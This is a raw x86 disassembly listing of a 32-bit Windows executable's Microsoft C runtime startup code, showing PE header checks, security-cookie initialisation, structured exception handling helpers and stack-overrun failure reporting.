  406fc8:	int3   
  406fc9:	int3   
  406fca:	int3   
  406fcb:	int3   
  406fcc:	int3   
  406fcd:	int3   
  406fce:	int3   
  406fcf:	int3   
  406fd0:	mov    eax,0x5a4d
  406fd5:	cmp    WORD PTR ds:0x400000,ax
  406fdc:	je     0x406fe2
  406fde:	xor    eax,eax
  406fe0:	jmp    0x407030
  406fe2:	mov    ecx,DWORD PTR ds:0x40003c
  406fe8:	cmp    DWORD PTR [ecx+0x400000],0x4550
  406ff2:	jne    0x406fde
  406ff4:	movzx  eax,WORD PTR [ecx+0x400018]
  406ffb:	cmp    eax,0x10b
  407000:	je     0x40701c
  407002:	cmp    eax,0x20b
  407007:	jne    0x406fde
  407009:	xor    eax,eax
  40700b:	cmp    DWORD PTR [ecx+0x400084],0xe
  407012:	jbe    0x407030
  407014:	cmp    DWORD PTR [ecx+0x4000f8],eax
  40701a:	jmp    0x40702d
  40701c:	xor    eax,eax
  40701e:	cmp    DWORD PTR [ecx+0x400074],0xe
  407025:	jbe    0x407030
  407027:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40702d:	setne  al
  407030:	push   0x2
  407032:	mov    ds:0x40905c,eax
  407037:	call   0x4074de
  40703c:	push   eax
  40703d:	call   DWORD PTR ds:0x40a12c
  407043:	or     DWORD PTR ds:0x4093c0,0xffffffff
  40704a:	or     DWORD PTR ds:0x4093c4,0xffffffff
  407051:	pop    ecx
  407052:	pop    ecx
  407053:	call   DWORD PTR ds:0x40a11c
  407059:	mov    ecx,DWORD PTR ds:0x409070
  40705f:	mov    DWORD PTR [eax],ecx
  407061:	call   DWORD PTR ds:0x40a138
  407067:	mov    ecx,DWORD PTR ds:0x409064
  40706d:	mov    DWORD PTR [eax],ecx
  40706f:	call   0x407530
  407074:	cmp    DWORD PTR ds:0x409000,0x0
  40707b:	jne    0x407089
  40707d:	push   0x407530
  407082:	call   DWORD PTR ds:0x40a118
  407088:	pop    ecx
  407089:	call   0x40773f
  40708e:	xor    eax,eax
  407090:	ret    
  407091:	int3   
  407092:	int3   
  407093:	int3   
  407094:	int3   
  407095:	int3   
  407096:	int3   
  407097:	int3   
  407098:	int3   
  407099:	int3   
  40709a:	int3   
  40709b:	int3   
  40709c:	int3   
  40709d:	int3   
  40709e:	int3   
  40709f:	int3   
  4070a0:	mov    eax,ds:0x40906c
  4070a5:	push   0x409060
  4070aa:	push   DWORD PTR ds:0x409068
  4070b0:	mov    ds:0x409060,eax
  4070b5:	push   0x409054
  4070ba:	push   0x409050
  4070bf:	push   0x40904c
  4070c4:	call   DWORD PTR ds:0x40a130
  4070ca:	add    esp,0x14
  4070cd:	mov    ds:0x409058,eax
  4070d2:	ret    
  4070d3:	int3   
  4070d4:	int3   
  4070d5:	int3   
  4070d6:	int3   
  4070d7:	int3   
  4070d8:	push   0x5c
  4070da:	push   0x407e78
  4070df:	call   0x407764
  4070e4:	and    DWORD PTR [ebp-0x24],0x0
  4070e8:	and    DWORD PTR [ebp-0x4],0x0
  4070ec:	lea    eax,[ebp-0x6c]
  4070ef:	push   eax
  4070f0:	call   DWORD PTR ds:0x40a08c
  4070f6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4070fd:	xor    ebx,ebx
  4070ff:	inc    ebx
  407100:	mov    DWORD PTR [ebp-0x4],ebx
  407103:	mov    eax,fs:0x18
  407109:	mov    edi,DWORD PTR [eax+0x4]
  40710c:	xor    esi,esi
  40710e:	mov    edx,0x4093b8
  407113:	mov    ecx,edi
  407115:	xor    eax,eax
  407117:	lock cmpxchg DWORD PTR [edx],ecx
  40711b:	test   eax,eax
  40711d:	je     0x407125
  40711f:	cmp    eax,edi
  407121:	jne    0x407137
  407123:	mov    esi,ebx
  407125:	cmp    DWORD PTR ds:0x4093bc,ebx
  40712b:	jne    0x407144
  40712d:	push   0x1f
  40712f:	call   0x40751a
  407134:	pop    ecx
  407135:	jmp    0x407173
  407137:	push   0x3e8
  40713c:	call   DWORD PTR ds:0x40a0a4
  407142:	jmp    0x40710e
  407144:	cmp    DWORD PTR ds:0x4093bc,0x0
  40714b:	jne    0x40716d
  40714d:	mov    DWORD PTR ds:0x4093bc,ebx
  407153:	push   0x401024
  407158:	push   0x401018
  40715d:	call   0x4072c4
  407162:	pop    ecx
  407163:	pop    ecx
  407164:	test   eax,eax
  407166:	je     0x407173
  407168:	jmp    0x4072ad
  40716d:	mov    DWORD PTR ds:0x409048,ebx
  407173:	cmp    DWORD PTR ds:0x4093bc,ebx
  407179:	jne    0x407196
  40717b:	push   0x401014
  407180:	push   0x401000
  407185:	call   0x407758
  40718a:	pop    ecx
  40718b:	pop    ecx
  40718c:	mov    DWORD PTR ds:0x4093bc,0x2
  407196:	test   esi,esi
  407198:	jne    0x4071a3
  40719a:	xor    eax,eax
  40719c:	mov    ecx,0x4093b8
  4071a1:	xchg   DWORD PTR [ecx],eax
  4071a3:	cmp    DWORD PTR ds:0x4093c8,0x0
  4071aa:	je     0x4071d1
  4071ac:	push   0x4093c8
  4071b1:	call   0x407590
  4071b6:	pop    ecx
  4071b7:	test   eax,eax
  4071b9:	je     0x4071d1
  4071bb:	push   0x0
  4071bd:	push   0x2
  4071bf:	push   0x0
  4071c1:	mov    esi,DWORD PTR ds:0x4093c8
  4071c7:	mov    ecx,esi
  4071c9:	call   DWORD PTR ds:0x40a1c4
  4071cf:	call   esi
  4071d1:	mov    eax,ds:0x40a110
  4071d6:	mov    ecx,DWORD PTR [eax]
  4071d8:	test   ecx,ecx
  4071da:	je     0x4072ad
  4071e0:	mov    DWORD PTR [ebp-0x20],ecx
  4071e3:	push   0x20
  4071e5:	pop    esi
  4071e6:	mov    edx,DWORD PTR [ebp-0x24]
  4071e9:	movzx  eax,WORD PTR [ecx]
  4071ec:	cmp    ax,si
  4071ef:	ja     0x407241
  4071f1:	test   ax,ax
  4071f4:	je     0x4071fa
  4071f6:	test   edx,edx
  4071f8:	jne    0x407241
  4071fa:	movzx  eax,WORD PTR [ecx]
  4071fd:	test   ax,ax
  407200:	je     0x40720f
  407202:	cmp    ax,si
  407205:	ja     0x40720f
  407207:	add    ecx,0x2
  40720a:	mov    DWORD PTR [ebp-0x20],ecx
  40720d:	jmp    0x4071fa
  40720f:	test   BYTE PTR [ebp-0x40],0x1
  407213:	je     0x40721b
  407215:	movzx  eax,WORD PTR [ebp-0x3c]
  407219:	jmp    0x40721e
  40721b:	push   0xa
  40721d:	pop    eax
  40721e:	push   eax
  40721f:	push   ecx
  407220:	push   0x0
  407222:	push   0x400000
  407227:	call   0x403c02
  40722c:	mov    ds:0x409044,eax
  407231:	cmp    DWORD PTR ds:0x40905c,0x0
  407238:	jne    0x407289
  40723a:	push   eax
  40723b:	call   DWORD PTR ds:0x40a128
  407241:	cmp    eax,0x22
  407244:	jne    0x407252
  407246:	xor    eax,eax
  407248:	test   edx,edx
  40724a:	sete   al
  40724d:	mov    edx,eax
  40724f:	mov    DWORD PTR [ebp-0x24],edx
  407252:	add    ecx,0x2
  407255:	mov    DWORD PTR [ebp-0x20],ecx
  407258:	jmp    0x4071e9
  40725a:	mov    ecx,DWORD PTR [ebp-0x14]
  40725d:	mov    eax,DWORD PTR [ecx]
  40725f:	mov    eax,DWORD PTR [eax]
  407261:	mov    DWORD PTR [ebp-0x28],eax
  407264:	push   ecx
  407265:	push   eax
  407266:	call   0x407464
  40726b:	pop    ecx
  40726c:	pop    ecx
  40726d:	ret    
  40726e:	mov    esp,DWORD PTR [ebp-0x18]
  407271:	mov    eax,DWORD PTR [ebp-0x28]
  407274:	mov    ds:0x409044,eax
  407279:	cmp    DWORD PTR ds:0x40905c,0x0
  407280:	jne    0x407289
  407282:	push   eax
  407283:	call   DWORD PTR ds:0x40a124
  407289:	cmp    DWORD PTR ds:0x409048,0x0
  407290:	jne    0x40729d
  407292:	call   DWORD PTR ds:0x40a120
  407298:	mov    eax,ds:0x409044
  40729d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4072a4:	jmp    0x4072b9
  4072a6:	xor    eax,eax
  4072a8:	inc    eax
  4072a9:	ret    
  4072aa:	mov    esp,DWORD PTR [ebp-0x18]
  4072ad:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4072b4:	mov    eax,0xff
  4072b9:	call   0x4077ac
  4072be:	ret    
  4072bf:	int3   
  4072c0:	int3   
  4072c1:	int3   
  4072c2:	int3   
  4072c3:	int3   
  4072c4:	mov    edi,edi
  4072c6:	push   ebp
  4072c7:	mov    ebp,esp
  4072c9:	push   ecx
  4072ca:	mov    eax,ds:0x409004
  4072cf:	xor    eax,ebp
  4072d1:	mov    DWORD PTR [ebp-0x4],eax
  4072d4:	push   esi
  4072d5:	mov    esi,DWORD PTR [ebp+0x8]
  4072d8:	xor    eax,eax
  4072da:	cmp    esi,DWORD PTR [ebp+0xc]
  4072dd:	jae    0x4072fd
  4072df:	push   edi
  4072e0:	test   eax,eax
  4072e2:	jne    0x4072fc
  4072e4:	mov    edi,DWORD PTR [esi]
  4072e6:	test   edi,edi
  4072e8:	je     0x4072f4
  4072ea:	mov    ecx,edi
  4072ec:	call   DWORD PTR ds:0x40a1c4
  4072f2:	call   edi
  4072f4:	add    esi,0x4
  4072f7:	cmp    esi,DWORD PTR [ebp+0xc]
  4072fa:	jb     0x4072e0
  4072fc:	pop    edi
  4072fd:	mov    ecx,DWORD PTR [ebp-0x4]
  407300:	xor    ecx,ebp
  407302:	pop    esi
  407303:	call   0x407330
  407308:	mov    esp,ebp
  40730a:	pop    ebp
  40730b:	ret    
  40730c:	int3   
  40730d:	int3   
  40730e:	int3   
  40730f:	int3   
  407310:	int3   
  407311:	int3   
  407312:	int3   
  407313:	int3   
  407314:	int3   
  407315:	int3   
  407316:	int3   
  407317:	int3   
  407318:	int3   
  407319:	int3   
  40731a:	int3   
  40731b:	int3   
  40731c:	int3   
  40731d:	int3   
  40731e:	int3   
  40731f:	int3   
  407320:	call   0x407698
  407325:	jmp    0x4070d8
  40732a:	int3   
  40732b:	int3   
  40732c:	int3   
  40732d:	int3   
  40732e:	int3   
  40732f:	int3   
  407330:	cmp    ecx,DWORD PTR ds:0x409004
  407336:	jne    0x40733b
  407338:	ret    0x0
  40733b:	jmp    0x407825
  407340:	int3   
  407341:	int3   
  407342:	int3   
  407343:	int3   
  407344:	int3   
  407345:	push   0x18
  407347:	push   0x407ea0
  40734c:	call   0x407764
  407351:	and    DWORD PTR [ebp-0x28],0x0
  407355:	mov    eax,ds:0x4093c4
  40735a:	mov    DWORD PTR [ebp-0x20],eax
  40735d:	cmp    eax,0xffffffff
  407360:	jne    0x407378
  407362:	push   DWORD PTR [ebp+0x8]
  407365:	mov    esi,DWORD PTR ds:0x40a100
  40736b:	mov    ecx,esi
  40736d:	call   DWORD PTR ds:0x40a1c4
  407373:	call   esi
  407375:	pop    ecx
  407376:	jmp    0x4073cc
  407378:	push   0x8
  40737a:	call   0x40793a
  40737f:	pop    ecx
  407380:	and    DWORD PTR [ebp-0x4],0x0
  407384:	mov    eax,ds:0x4093c4
  407389:	mov    DWORD PTR [ebp-0x20],eax
  40738c:	mov    eax,ds:0x4093c0
  407391:	mov    DWORD PTR [ebp-0x24],eax
  407394:	lea    eax,[ebp-0x24]
  407397:	push   eax
  407398:	lea    eax,[ebp-0x20]
  40739b:	push   eax
  40739c:	push   DWORD PTR [ebp+0x8]
  40739f:	call   0x407952
  4073a4:	add    esp,0xc
  4073a7:	mov    esi,eax
  4073a9:	mov    DWORD PTR [ebp-0x28],esi
  4073ac:	mov    ecx,DWORD PTR [ebp-0x20]
  4073af:	mov    DWORD PTR ds:0x4093c4,ecx
  4073b5:	mov    ecx,DWORD PTR [ebp-0x24]
  4073b8:	mov    DWORD PTR ds:0x4093c0,ecx
  4073be:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4073c5:	call   0x4073d5
  4073ca:	mov    eax,esi
  4073cc:	call   0x4077ac
  4073d1:	ret    
  4073d2:	mov    esi,DWORD PTR [ebp-0x28]
  4073d5:	push   0x8
  4073d7:	call   0x407946
  4073dc:	pop    ecx
  4073dd:	ret    
  4073de:	int3   
  4073df:	int3   
  4073e0:	int3   
  4073e1:	int3   
  4073e2:	int3   
  4073e3:	mov    edi,edi
  4073e5:	push   ebp
  4073e6:	mov    ebp,esp
  4073e8:	push   DWORD PTR [ebp+0x8]
  4073eb:	call   0x407345
  4073f0:	neg    eax
  4073f2:	pop    ecx
  4073f3:	sbb    eax,eax
  4073f5:	neg    eax
  4073f7:	dec    eax
  4073f8:	pop    ebp
  4073f9:	ret    
  4073fa:	int3   
  4073fb:	int3   
  4073fc:	int3   
  4073fd:	int3   
  4073fe:	int3   
  4073ff:	int3   
  407400:	mov    edi,edi
  407402:	push   ebp
  407403:	mov    ebp,esp
  407405:	mov    eax,DWORD PTR [ebp+0x8]
  407408:	mov    eax,DWORD PTR [eax]
  40740a:	cmp    DWORD PTR [eax],0xe06d7363
  407410:	jne    0x40743d
  407412:	cmp    DWORD PTR [eax+0x10],0x3
  407416:	jne    0x40743d
  407418:	mov    eax,DWORD PTR [eax+0x14]
  40741b:	cmp    eax,0x19930520
  407420:	je     0x407437
  407422:	cmp    eax,0x19930521
  407427:	je     0x407437
  407429:	cmp    eax,0x19930522
  40742e:	je     0x407437
  407430:	cmp    eax,0x1994000
  407435:	jne    0x40743d
  407437:	call   DWORD PTR ds:0x40a0fc
  40743d:	xor    eax,eax
  40743f:	pop    ebp
  407440:	ret    0x4
  407443:	int3   
  407444:	int3   
  407445:	int3   
  407446:	int3   
  407447:	int3   
  407448:	int3   
  407449:	int3   
  40744a:	int3   
  40744b:	int3   
  40744c:	int3   
  40744d:	int3   
  40744e:	int3   
  40744f:	int3   
  407450:	push   0x407400
  407455:	call   DWORD PTR ds:0x40a074
  40745b:	xor    eax,eax
  40745d:	ret    
  40745e:	int3   
  40745f:	int3   
  407460:	int3   
  407461:	int3   
  407462:	int3   
  407463:	int3   
  407464:	jmp    DWORD PTR ds:0x40a13c
  40746a:	int3   
  40746b:	int3   
  40746c:	int3   
  40746d:	int3   
  40746e:	int3   
  40746f:	push   0xc
  407471:	push   0x407ec0
  407476:	call   0x407960
  40747b:	xor    ecx,ecx
  40747d:	mov    eax,DWORD PTR [ebp+0x8]
  407480:	test   eax,eax
  407482:	je     0x4074cf
  407484:	cmp    eax,0xffffffff
  407487:	je     0x4074cf
  407489:	mov    DWORD PTR [ebp-0x4],ecx
  40748c:	mov    edx,0x5a4d
  407491:	cmp    WORD PTR [eax],dx
  407494:	jne    0x4074c8
  407496:	mov    edx,DWORD PTR [eax+0x3c]
  407499:	test   edx,edx
  40749b:	js     0x4074c8
  40749d:	cmp    edx,0x10000000
  4074a3:	jae    0x4074c8
  4074a5:	add    eax,edx
  4074a7:	mov    DWORD PTR [ebp-0x1c],eax
  4074aa:	mov    ecx,DWORD PTR [eax]
  4074ac:	sub    ecx,0x4550
  4074b2:	neg    ecx
  4074b4:	sbb    ecx,ecx
  4074b6:	not    ecx
  4074b8:	and    ecx,eax
  4074ba:	jmp    0x4074c5
  4074bc:	xor    eax,eax
  4074be:	inc    eax
  4074bf:	ret    
  4074c0:	mov    esp,DWORD PTR [ebp-0x18]
  4074c3:	xor    ecx,ecx
  4074c5:	mov    DWORD PTR [ebp-0x1c],ecx
  4074c8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4074cf:	mov    eax,ecx
  4074d1:	call   0x4079a5
  4074d6:	ret    0x4
  4074d9:	int3   
  4074da:	int3   
  4074db:	int3   
  4074dc:	int3   
  4074dd:	int3   
  4074de:	mov    edi,edi
  4074e0:	push   ebp
  4074e1:	mov    ebp,esp
  4074e3:	push   0x0
  4074e5:	call   DWORD PTR ds:0x40a080
  4074eb:	test   eax,eax
  4074ed:	je     0x40750f
  4074ef:	push   eax
  4074f0:	call   0x40746f
  4074f5:	test   eax,eax
  4074f7:	je     0x40750f
  4074f9:	movzx  ecx,WORD PTR [eax+0x5c]
  4074fd:	push   0x2
  4074ff:	pop    eax
  407500:	cmp    cx,ax
  407503:	je     0x407512
  407505:	cmp    ecx,0x3
  407508:	jne    0x40750f
  40750a:	xor    eax,eax
  40750c:	inc    eax
  40750d:	pop    ebp
  40750e:	ret    
  40750f:	mov    eax,DWORD PTR [ebp+0x8]
  407512:	pop    ebp
  407513:	ret    
  407514:	int3   
  407515:	int3   
  407516:	int3   
  407517:	int3   
  407518:	int3   
  407519:	int3   
  40751a:	jmp    DWORD PTR ds:0x40a134
  407520:	int3   
  407521:	int3   
  407522:	int3   
  407523:	int3   
  407524:	int3   
  407525:	int3   
  407526:	int3   
  407527:	int3   
  407528:	int3   
  407529:	int3   
  40752a:	int3   
  40752b:	int3   
  40752c:	int3   
  40752d:	int3   
  40752e:	int3   
  40752f:	int3   
  407530:	xor    eax,eax
  407532:	ret    
  407533:	int3   
  407534:	int3   
  407535:	int3   
  407536:	int3   
  407537:	int3   
  407538:	int3   
  407539:	int3   
  40753a:	int3   
  40753b:	int3   
  40753c:	int3   
  40753d:	int3   
  40753e:	int3   
  40753f:	int3   
  407540:	mov    edi,edi
  407542:	push   ebp
  407543:	mov    ebp,esp
  407545:	mov    eax,DWORD PTR [ebp+0x8]
  407548:	xor    edx,edx
  40754a:	push   ebx
  40754b:	push   esi
  40754c:	push   edi
  40754d:	mov    ecx,DWORD PTR [eax+0x3c]
  407550:	add    ecx,eax
  407552:	movzx  eax,WORD PTR [ecx+0x14]
  407556:	movzx  ebx,WORD PTR [ecx+0x6]
  40755a:	add    eax,0x18
  40755d:	add    eax,ecx
  40755f:	test   ebx,ebx
  407561:	je     0x40757e
  407563:	mov    edi,DWORD PTR [ebp+0xc]
  407566:	mov    esi,DWORD PTR [eax+0xc]
  407569:	cmp    edi,esi
  40756b:	jb     0x407576
  40756d:	mov    ecx,DWORD PTR [eax+0x8]
  407570:	add    ecx,esi
  407572:	cmp    edi,ecx
  407574:	jb     0x407580
  407576:	inc    edx
  407577:	add    eax,0x28
  40757a:	cmp    edx,ebx
  40757c:	jb     0x407566
  40757e:	xor    eax,eax
  407580:	pop    edi
  407581:	pop    esi
  407582:	pop    ebx
  407583:	pop    ebp
  407584:	ret    
  407585:	int3   
  407586:	int3   
  407587:	int3   
  407588:	int3   
  407589:	int3   
  40758a:	int3   
  40758b:	int3   
  40758c:	int3   
  40758d:	int3   
  40758e:	int3   
  40758f:	int3   
  407590:	mov    edi,edi
  407592:	push   ebp
  407593:	mov    ebp,esp
  407595:	push   0xfffffffe
  407597:	push   0x407ee0
  40759c:	push   0x4077c0
  4075a1:	mov    eax,fs:0x0
  4075a7:	push   eax
  4075a8:	sub    esp,0x8
  4075ab:	push   ebx
  4075ac:	push   esi
  4075ad:	push   edi
  4075ae:	mov    eax,ds:0x409004
  4075b3:	xor    DWORD PTR [ebp-0x8],eax
  4075b6:	xor    eax,ebp
  4075b8:	push   eax
  4075b9:	lea    eax,[ebp-0x10]
  4075bc:	mov    fs:0x0,eax
  4075c2:	mov    DWORD PTR [ebp-0x18],esp
  4075c5:	mov    DWORD PTR [ebp-0x4],0x0
  4075cc:	push   0x400000
  4075d1:	call   0x407660
  4075d6:	add    esp,0x4
  4075d9:	test   eax,eax
  4075db:	je     0x407631
  4075dd:	mov    eax,DWORD PTR [ebp+0x8]
  4075e0:	sub    eax,0x400000
  4075e5:	push   eax
  4075e6:	push   0x400000
  4075eb:	call   0x407540
  4075f0:	add    esp,0x8
  4075f3:	test   eax,eax
  4075f5:	je     0x407631
  4075f7:	mov    eax,DWORD PTR [eax+0x24]
  4075fa:	shr    eax,0x1f
  4075fd:	not    eax
  4075ff:	and    eax,0x1
  407602:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407609:	mov    ecx,DWORD PTR [ebp-0x10]
  40760c:	mov    DWORD PTR fs:0x0,ecx
  407613:	pop    ecx
  407614:	pop    edi
  407615:	pop    esi
  407616:	pop    ebx
  407617:	mov    esp,ebp
  407619:	pop    ebp
  40761a:	ret    
  40761b:	mov    eax,DWORD PTR [ebp-0x14]
  40761e:	mov    eax,DWORD PTR [eax]
  407620:	xor    ecx,ecx
  407622:	cmp    DWORD PTR [eax],0xc0000005
  407628:	sete   cl
  40762b:	mov    eax,ecx
  40762d:	ret    
  40762e:	mov    esp,DWORD PTR [ebp-0x18]
  407631:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407638:	xor    eax,eax
  40763a:	mov    ecx,DWORD PTR [ebp-0x10]
  40763d:	mov    DWORD PTR fs:0x0,ecx
  407644:	pop    ecx
  407645:	pop    edi
  407646:	pop    esi
  407647:	pop    ebx
  407648:	mov    esp,ebp
  40764a:	pop    ebp
  40764b:	ret    
  40764c:	int3   
  40764d:	int3   
  40764e:	int3   
  40764f:	int3   
  407650:	int3   
  407651:	int3   
  407652:	int3   
  407653:	int3   
  407654:	int3   
  407655:	int3   
  407656:	int3   
  407657:	int3   
  407658:	int3   
  407659:	int3   
  40765a:	int3   
  40765b:	int3   
  40765c:	int3   
  40765d:	int3   
  40765e:	int3   
  40765f:	int3   
  407660:	mov    edi,edi
  407662:	push   ebp
  407663:	mov    ebp,esp
  407665:	mov    eax,DWORD PTR [ebp+0x8]
  407668:	mov    ecx,0x5a4d
  40766d:	cmp    WORD PTR [eax],cx
  407670:	je     0x407676
  407672:	xor    eax,eax
  407674:	pop    ebp
  407675:	ret    
  407676:	mov    ecx,DWORD PTR [eax+0x3c]
  407679:	add    ecx,eax
  40767b:	xor    eax,eax
  40767d:	cmp    DWORD PTR [ecx],0x4550
  407683:	jne    0x407691
  407685:	mov    edx,0x10b
  40768a:	cmp    WORD PTR [ecx+0x18],dx
  40768e:	sete   al
  407691:	pop    ebp
  407692:	ret    
  407693:	int3   
  407694:	int3   
  407695:	int3   
  407696:	int3   
  407697:	int3   
  407698:	mov    edi,edi
  40769a:	push   ebp
  40769b:	mov    ebp,esp
  40769d:	sub    esp,0x14
  4076a0:	and    DWORD PTR [ebp-0xc],0x0
  4076a4:	and    DWORD PTR [ebp-0x8],0x0
  4076a8:	mov    eax,ds:0x409004
  4076ad:	push   esi
  4076ae:	push   edi
  4076af:	mov    edi,0xbb40e64e
  4076b4:	mov    esi,0xffff0000
  4076b9:	cmp    eax,edi
  4076bb:	je     0x4076ca
  4076bd:	test   esi,eax
  4076bf:	je     0x4076ca
  4076c1:	not    eax
  4076c3:	mov    ds:0x409008,eax
  4076c8:	jmp    0x407734
  4076ca:	lea    eax,[ebp-0xc]
  4076cd:	push   eax
  4076ce:	call   DWORD PTR ds:0x40a0ac
  4076d4:	mov    eax,DWORD PTR [ebp-0x8]
  4076d7:	xor    eax,DWORD PTR [ebp-0xc]
  4076da:	mov    DWORD PTR [ebp-0x4],eax
  4076dd:	call   DWORD PTR ds:0x40a04c
  4076e3:	xor    DWORD PTR [ebp-0x4],eax
  4076e6:	call   DWORD PTR ds:0x40a088
  4076ec:	xor    DWORD PTR [ebp-0x4],eax
  4076ef:	call   DWORD PTR ds:0x40a0b0
  4076f5:	xor    eax,DWORD PTR [ebp-0x4]
  4076f8:	lea    ecx,[ebp-0x4]
  4076fb:	xor    eax,ecx
  4076fd:	mov    DWORD PTR [ebp-0x4],eax
  407700:	lea    eax,[ebp-0x14]
  407703:	push   eax
  407704:	call   DWORD PTR ds:0x40a09c
  40770a:	mov    eax,DWORD PTR [ebp-0x10]
  40770d:	xor    eax,DWORD PTR [ebp-0x14]
  407710:	mov    ecx,DWORD PTR [ebp-0x4]
  407713:	xor    ecx,eax
  407715:	cmp    ecx,edi
  407717:	je     0x407721
  407719:	test   DWORD PTR ds:0x409004,esi
  40771f:	jne    0x407726
  407721:	mov    ecx,0xbb40e64f
  407726:	mov    DWORD PTR ds:0x409004,ecx
  40772c:	not    ecx
  40772e:	mov    DWORD PTR ds:0x409008,ecx
  407734:	pop    edi
  407735:	pop    esi
  407736:	mov    esp,ebp
  407738:	pop    ebp
  407739:	ret    
  40773a:	int3   
  40773b:	int3   
  40773c:	int3   
  40773d:	int3   
  40773e:	int3   
  40773f:	push   0x30000
  407744:	push   0x10000
  407749:	call   DWORD PTR ds:0x40a0f8
  40774f:	pop    ecx
  407750:	pop    ecx
  407751:	ret    
  407752:	int3   
  407753:	int3   
  407754:	int3   
  407755:	int3   
  407756:	int3   
  407757:	int3   
  407758:	jmp    DWORD PTR ds:0x40a114
  40775e:	int3   
  40775f:	int3   
  407760:	int3   
  407761:	int3   
  407762:	int3   
  407763:	int3   
  407764:	push   0x4077c0
  407769:	push   DWORD PTR fs:0x0
  407770:	mov    eax,DWORD PTR [esp+0x10]
  407774:	mov    DWORD PTR [esp+0x10],ebp
  407778:	lea    ebp,[esp+0x10]
  40777c:	sub    esp,eax
  40777e:	push   ebx
  40777f:	push   esi
  407780:	push   edi
  407781:	mov    eax,ds:0x409004
  407786:	xor    DWORD PTR [ebp-0x4],eax
  407789:	xor    eax,ebp
  40778b:	mov    DWORD PTR [ebp-0x1c],eax
  40778e:	push   eax
  40778f:	mov    DWORD PTR [ebp-0x18],esp
  407792:	push   DWORD PTR [ebp-0x8]
  407795:	mov    eax,DWORD PTR [ebp-0x4]
  407798:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40779f:	mov    DWORD PTR [ebp-0x8],eax
  4077a2:	lea    eax,[ebp-0x10]
  4077a5:	mov    fs:0x0,eax
  4077ab:	ret    
  4077ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4077af:	xor    ecx,ebp
  4077b1:	call   0x407330
  4077b6:	jmp    0x4079a5
  4077bb:	int3   
  4077bc:	int3   
  4077bd:	int3   
  4077be:	int3   
  4077bf:	int3   
  4077c0:	mov    edi,edi
  4077c2:	push   ebp
  4077c3:	mov    ebp,esp
  4077c5:	push   DWORD PTR [ebp+0x14]
  4077c8:	push   DWORD PTR [ebp+0x10]
  4077cb:	push   DWORD PTR [ebp+0xc]
  4077ce:	push   DWORD PTR [ebp+0x8]
  4077d1:	push   0x407330
  4077d6:	push   0x409004
  4077db:	call   0x4079be
  4077e0:	add    esp,0x18
  4077e3:	pop    ebp
  4077e4:	ret    
  4077e5:	int3   
  4077e6:	int3   
  4077e7:	int3   
  4077e8:	int3   
  4077e9:	int3   
  4077ea:	int3   
  4077eb:	int3   
  4077ec:	int3   
  4077ed:	int3   
  4077ee:	int3   
  4077ef:	int3   
  4077f0:	ret    
  4077f1:	int3   
  4077f2:	int3   
  4077f3:	int3   
  4077f4:	int3   
  4077f5:	int3   
  4077f6:	mov    edi,edi
  4077f8:	push   ebp
  4077f9:	mov    ebp,esp
  4077fb:	push   0x0
  4077fd:	call   DWORD PTR ds:0x40a074
  407803:	push   DWORD PTR [ebp+0x8]
  407806:	call   DWORD PTR ds:0x40a078
  40780c:	push   0xc0000409
  407811:	call   DWORD PTR ds:0x40a094
  407817:	push   eax
  407818:	call   DWORD PTR ds:0x40a090
  40781e:	pop    ebp
  40781f:	ret    
  407820:	int3   
  407821:	int3   
  407822:	int3   
  407823:	int3   
  407824:	int3   
  407825:	mov    edi,edi
  407827:	push   ebp
  407828:	mov    ebp,esp
  40782a:	sub    esp,0x324
  407830:	mov    ds:0x409178,eax
  407835:	mov    DWORD PTR ds:0x409174,ecx
  40783b:	mov    DWORD PTR ds:0x409170,edx
  407841:	mov    DWORD PTR ds:0x40916c,ebx
  407847:	mov    DWORD PTR ds:0x409168,esi
  40784d:	mov    DWORD PTR ds:0x409164,edi
  407853:	data16 mov WORD PTR ds:0x409190,ss
  40785a:	data16 mov WORD PTR ds:0x409184,cs
  407861:	data16 mov WORD PTR ds:0x409160,ds
  407868:	data16 mov WORD PTR ds:0x40915c,es
  40786f:	data16 mov WORD PTR ds:0x409158,fs
  407876:	data16 mov WORD PTR ds:0x409154,gs
  40787d:	pushf  
  40787e:	pop    DWORD PTR ds:0x409188
  407884:	mov    eax,DWORD PTR [ebp+0x0]
  407887:	mov    ds:0x40917c,eax
  40788c:	mov    eax,DWORD PTR [ebp+0x4]
  40788f:	mov    ds:0x409180,eax
  407894:	lea    eax,[ebp+0x8]
  407897:	mov    ds:0x40918c,eax
  40789c:	mov    eax,DWORD PTR [ebp-0x324]
  4078a2:	mov    DWORD PTR ds:0x4090c8,0x10001
  4078ac:	mov    eax,ds:0x409180
  4078b1:	mov    ds:0x409084,eax
  4078b6:	mov    DWORD PTR ds:0x409078,0xc0000409
  4078c0:	mov    DWORD PTR ds:0x40907c,0x1
  4078ca:	mov    DWORD PTR ds:0x409088,0x3
  4078d4:	push   0x4
  4078d6:	pop    eax
  4078d7:	imul   eax,eax,0x0
  4078da:	mov    DWORD PTR [eax+0x40908c],0x2
  4078e4:	push   0x4
  4078e6:	pop    eax
  4078e7:	shl    eax,0x0
  4078ea:	mov    ecx,DWORD PTR ds:0x409004
  4078f0:	mov    DWORD PTR [eax+0x40908c],ecx
  4078f6:	push   0x4
  4078f8:	pop    eax
  4078f9:	shl    eax,1
  4078fb:	mov    ecx,DWORD PTR ds:0x409008
  407901:	mov    DWORD PTR [eax+0x40908c],ecx
  407907:	push   0x4
  407909:	pop    eax
  40790a:	imul   eax,eax,0x0
  40790d:	mov    ecx,DWORD PTR ds:0x409004
  407913:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  407917:	push   0x4
  407919:	pop    eax
  40791a:	shl    eax,0x0
  40791d:	mov    ecx,DWORD PTR ds:0x409008
  407923:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  407927:	push   0x4010ac
  40792c:	call   0x4077f6
  407931:	mov    esp,ebp
  407933:	pop    ebp
  407934:	ret    
  407935:	int3   
  407936:	int3   
  407937:	int3   
  407938:	int3   
  407939:	int3   
  40793a:	jmp    DWORD PTR ds:0x40a10c
  407940:	int3   
  407941:	int3   
  407942:	int3   
  407943:	int3   
  407944:	int3   
